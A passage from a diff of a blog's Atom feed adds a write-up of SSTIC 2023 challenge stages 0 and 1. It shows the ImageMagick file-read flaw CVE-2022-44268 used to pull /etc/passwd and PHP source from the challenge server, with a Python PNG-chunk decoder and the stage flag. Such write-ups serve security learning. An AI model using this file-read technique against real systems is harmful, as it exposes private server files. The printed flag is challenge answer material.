@@ -1787,7 +1787,328 @@ root@pandora:~# cat /root/root.txt
 &lt;p&gt;A nice box with a really interesting user part with multiple stage, the UDP
 service is easy to miss as there is not a lot of boxes with them and the UDP
 scan are pretty slow. The chaining of different vulnerabilities in the Pandora
-application is also interesting. Finally the root part is trivial.&lt;/p&gt;</content><category term="security"/><category term="security"/><category term="boot2root"/><category term="HTB"/><category term="suid"/><category term="snmp"/><category term="pandora"/></entry><entry><title>HTB: Backdoor</title><link href="https://maggick.fr/2022/04/htb-backdoor.html" rel="alternate"/><published>2022-04-25T15:40:00+02:00</published><updated>2022-04-25T15:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-04-25:/2022/04/htb-backdoor.html</id><summary type="html">&lt;p&gt;&lt;img alt="Backdoor" class="align-left" src="/media/2022.04/backdoor_card.png" width="262"/&gt;&lt;/p&gt;
+application is also interesting. Finally the root part is trivial.&lt;/p&gt;</content><category term="security"/><category term="security"/><category term="boot2root"/><category term="HTB"/><category term="suid"/><category term="snmp"/><category term="pandora"/></entry><entry><title>Challenge SSTIC 2023 - stage 0 &amp; 1</title><link href="https://maggick.fr/2022/05/challenge-sstic-2023-stage-0-1.html" rel="alternate"/><published>2022-05-25T10:00:00+02:00</published><updated>2022-05-25T10:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-05-25:/2022/05/challenge-sstic-2023-stage-0-1.html</id><summary type="html">&lt;p&gt;&lt;img alt="A dog" class="align-left" src="/media/2023.05/sstic_nft.svg" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;As each year the French Security conference &lt;a href="https://sstic.org"&gt;SSTIC&lt;/a&gt; release a &lt;a href="https://www.sstic.org/2023/challenge/"&gt;security
+challenge&lt;/a&gt; prior to the conference.&lt;/p&gt;
+&lt;p&gt;This year the challenge seemed "easier" than the previous year as the stage 1 got 135 validations
+versus 86 validations in 2022.&lt;/p&gt;
+&lt;p&gt;This article will detail my solution for the step 0 and the step 1.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img alt="A dog" class="align-left" src="/media/2023.05/sstic_nft.svg" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;As each year the French Security conference &lt;a href="https://sstic.org"&gt;SSTIC&lt;/a&gt; release a &lt;a href="https://www.sstic.org/2023/challenge/"&gt;security
+challenge&lt;/a&gt; prior to the conference.&lt;/p&gt;
+&lt;p&gt;This year the challenge seemed "easier" than the previous year as the stage 1 got 135 validations
+versus 86 validations in 2022.&lt;/p&gt;
+&lt;p&gt;This article will detail my solution for the step 0 and the step 1.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Salud deoc’h !&lt;/p&gt;
+&lt;p&gt;Votre nouvelle boulangerie Trois Pains Zéro a décidé d’innover afin d'éviter les files d’attente
+et vous permettre de déguster notre recette phare : le fameux quatre-quarts.
+À partir du 1er juillet 2023, il vous suffira d’acquérir un Jeton Non-Fongible (JNF)
+de notre collection
+&lt;a href="https://testnets.opensea.io/assets/goerli/0x43F99c5517928be62935A1d7714408fae90d1896/1"&gt;sur OpenSea&lt;/a&gt;,
+et de le présenter en magasin pour recevoir votre précieux gâteau.&lt;/p&gt;
+&lt;p&gt;La page d’achat sera bientôt disponible pour tous nos clients et nous espérons vous voir bientôt
+en magasin.&lt;/p&gt;
+&lt;p&gt;Délicieusement vôtre,&lt;/p&gt;
+&lt;p&gt;Votre boulangerie Trois Pains Zéro&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;For non-French speaking people, the scenario was a bakery that will release a new product
+requiring the possession of an NFT to buy it. The goal is to access to NFT buying page. Our only input is an
+&lt;a href="https://testnets.opensea.io/assets/goerli/0x43F99c5517928be62935A1d7714408fae90d1896/1"&gt;OpenSea link&lt;/a&gt;.&lt;/p&gt;
+&lt;h1&gt;Stage 0&lt;/h1&gt;
+&lt;p&gt;We got to the NFT page on &lt;a href="https://testnets.opensea.io/assets/goerli/0x43F99c5517928be62935A1d7714408fae90d1896/1"&gt;OpenSea&lt;/a&gt;.
+The NFT was available on testnet so, we might have been able to buy it. But looking at the event section we
+realized that all the offers expired and there was no transaction.&lt;/p&gt;
+&lt;h2&gt;EXIF data&lt;/h2&gt;
+&lt;p&gt;I downloaded the SVG image to look for any comment in the SVG. We can see that the image is an embedded
+base64 PNG. We decode it and look at the EXIF data. This look like a dead end.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Profile Date Time               : 2023:02:28 15:28:27
+Profile File Signature          : acsp
+Primary Platform                : Apple Computer Inc.
+CMM Flags                       : Not Embedded, Independent
+Device Manufacturer             :
+Device Model                    :
+Device Attributes               : Reflective, Glossy, Positive, Color
+Rendering Intent                : Perceptual
+Connection Space Illuminant     : 0.9642 1 0.82491
+Profile Creator                 : Little CMS
+Profile ID                      : 0
+Profile Description             : GIMP built-in sRGB
+Profile Copyright               : Public Domain
+Media White Point               : 0.9642 1 0.82491
+Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168
+Red Matrix Column               : 0.43604 0.22249 0.01392
+Blue Matrix Column              : 0.14305 0.06061 0.71393
+Green Matrix Column             : 0.38512 0.7169 0.09706
+Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)
+Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)
+Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)
+Chromaticity Channels           : 3
+Chromaticity Colorant           : Unknown
+Chromaticity Channel 1          : 0.64 0.33002
+Chromaticity Channel 2          : 0.3 0.60001
+Chromaticity Channel 3          : 0.15001 0.06
+Device Mfg Desc                 : GIMP
+Device Model Desc               : sRGB
+XMP Toolkit                     : XMP Core 4.4.0-Exiv2
+Document ID                     : gimp:docid:gimp:6c654e1c-660f-4a8d-8684-e7dcb888f405
+Instance ID                     : xmp.iid:e3c835b5-b728-4065-90ae-b8701b2c0ee9
+Original Document ID            : xmp.did:69feb713-f517-4ae5-89df-8790fa24e448
+Format                          : image/png
+Api                             : 2.0
+Platform                        : Linux
+Time Stamp                      : 1677598603072742
+Version                         : 2.10.30
+Creator Tool                    : GIMP 2.10
+History Action                  : saved
+History Changed                 : /
+History Instance ID             : xmp.iid:dae6254d-2632-408f-bdce-210bbed3f9ef
+History Software Agent          : Gimp 2.10 (Linux)
+History When                    : 2023:02:28 16:36:43+01:00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Smart contract&lt;/h2&gt;
+&lt;p&gt;Following the &lt;a href="https://goerli.etherscan.io/address/0x43f99c5517928be62935a1d7714408fae90d1896"&gt;OpenSea contract address&lt;/a&gt;
+and looking at the contract we found a base64 encoded &lt;code&gt;BASE_URI&lt;/code&gt; parameter:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;"name"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;"Trois Pains Zero"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="s"&gt;"description"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;"Lobsterdog pastry chef."&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="s"&gt;"image"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;"https://nft.quatre-qu.art/nft-library.php?id=12"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="s"&gt;"external_url"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;"https://nft.quatre-qu.art/nft-library.php?id=12"&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We followed the &lt;code&gt;external_url&lt;/code&gt; and at the website root we found an image with the flag for stage 0.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="flag for stage 0" src="/media/2023.05/flag0.png"/&gt;&lt;/p&gt;
+&lt;h1&gt;Stage 1&lt;/h1&gt;
+&lt;h2&gt;Enumerating the NFT &lt;code&gt;id&lt;/code&gt; and other content&lt;/h2&gt;
+&lt;p&gt;There were an NFT from the &lt;code&gt;id&lt;/code&gt; parameter 1 (the flag) to 17, then there were placeholders until
+&lt;code&gt;9223372036854775807&lt;/code&gt; (I did not check all the IDs and supposed that there was nothing different from the
+placeholder).&lt;/p&gt;
+&lt;p&gt;We could also enumerate the image by using their ID with the image folder such as
+&lt;code&gt;https://nft.quatre-qu.art/images/4.png&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We also found an ELF binary at the &lt;code&gt;core&lt;/code&gt; location.&lt;/p&gt;
+&lt;h2&gt;Uploading new images - CVE-2022-44268&lt;/h2&gt;
+&lt;p&gt;Using the &lt;code&gt;id=0&lt;/code&gt; we landed on a page that allowed us resize image.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Create your own NFT gallery!
+Before creating your gallery, your image needs to be of the right size. Use this service to resize it!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Looking at the HTTP response from the web application we noticed the header
+&lt;code&gt;X-Powered-By ImageMagick/7.1.0-51&lt;/code&gt;. This version of ImageMagick was vulnerable to two CVE:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;CVE-2022-44267: Resource management error, The vulnerability allows a remote attacker to perform a denial of service (DoS) attack.&lt;/li&gt;
+&lt;li&gt;CVE-2022-44268: Information disclosure, A remote attacker can pass a specially crafted image to the application and embed contents of other files on the system into the resulting image.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The first vulnerability did not really interest us as this was a Deny of Service but the second one,
+CVE-2022-44268 was a Local File Inclusion and could allow us to retrieve files from the web server.&lt;/p&gt;
+&lt;p&gt;We quickly found an exploit for it &lt;a href="https://github.com/voidz0r/CVE-2022-44268"&gt;on GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Using the exploit README we generated an image and retrieve the content of the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python3 -c 'print(bytes.fromhex("726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a"))'
+b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We then retrieved the content of &lt;code&gt;var/www/html/index.php&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="resized image with index.php embedded" src="/media/2023.05/out_index_php.png"/&gt;&lt;/p&gt;
+&lt;p&gt;The output of &lt;code&gt;identify -verbose out_index_php.png&lt;/code&gt; did not display the file content in a &lt;code&gt;raw
+profile&lt;/code&gt; field. Instead, we just got the information that the field is &lt;code&gt;Profile-php: 49 bytes&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We will need to write a script in order to parse the PNG chunks and retrieve their data. A &lt;a href="https://pyokagan.name/blog/2019-10-14-png/"&gt;blog post
+from 2019 put us on the way&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We ended up with a python script that would decompress if needed and decode &lt;code&gt;tExt&lt;/code&gt; and &lt;code&gt;zTXt&lt;/code&gt; chunks.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;zlib&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
+
+&lt;span class="nb"&gt;input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'rb'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;PngSignature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\x89&lt;/span&gt;&lt;span class="s1"&gt;PNG&lt;/span&gt;&lt;span class="se"&gt;\r\n\x1a\n&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PngSignature&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;PngSignature&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Invalid PNG Signature'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;read_chunk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;chunk_length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chunk_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unpack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'&amp;gt;I4s'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;chunk_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chunk_length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;chunk_expected_crc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unpack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'&amp;gt;I'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;chunk_actual_crc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;zlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crc32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chunk_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;zlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crc32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'&amp;gt;4s'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chunk_type&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chunk_expected_crc&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;chunk_actual_crc&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'chunk checksum failed'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;chunk_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chunk_data&lt;/span&gt;
+
+&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;chunk_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chunk_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;read_chunk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chunk_type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'tEXt'&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'zTXt'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;chunk_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'Raw profile type php'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;chunk_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;""&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chunk_type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'zTXt'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="n"&gt;chunk_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;zlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decompress&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chunk_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;:]))&lt;/span&gt;
+        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="n"&gt;chunk_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;chunk_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
+        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromhex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;chunk_string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"utf-8"&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:])))&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chunk_type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'IEND'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;break&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Using the script with the image containing &lt;code&gt;index.php&lt;/code&gt;, we were redirected to another file.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python decoder.py out_index_php.png
+&lt;?php header("Location: /nft-library.php?id=1");
+&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We retrieved the &lt;code&gt;nft-library.php&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="resized image with nft-library.php embedded" src="/media/2023.05/out_nft-library_php.png"/&gt;&lt;/p&gt;
+&lt;p&gt;And we decoded it using our python script. This give us the step 1 flag as well as the path to two
+archives available on the server.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;python decoder.py out.png&lt;/span&gt;
+&lt;span class="x"&gt;R%&lt;/span&gt;&lt;span class="cp"&gt;&lt;?php&lt;/span&gt;
+&lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"X-Powered-By: ImageMagick/7.1.0-51"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="c1"&gt;// SSTIC{8c44f9aa39f4f69d26b91ae2b49ed4d2d029c0999e691f3122a883b01ee19fae}&lt;/span&gt;
+&lt;span class="c1"&gt;// Une sauvegarde de l'infrastructure est disponible dans les fichiers suivants&lt;/span&gt;
+&lt;span class="c1"&gt;// /backup.tgz, /devices.tgz&lt;/span&gt;
+&lt;span class="c1"&gt;//&lt;/span&gt;
+
+
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'id'&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$image_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'id'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1&gt;Highway to stage 2.x&lt;/h1&gt;
+&lt;p&gt;We retrieved the two images from the server using the CVE-2022-44268:&lt;/p&gt;
+&lt;p&gt;backup.tar.gz:
+&lt;img alt="resized image with backup.tar.gz embedded" src="/media/2023.05/out_backup_tgz.png"/&gt;&lt;/p&gt;
+&lt;p&gt;devices.tar.gz:
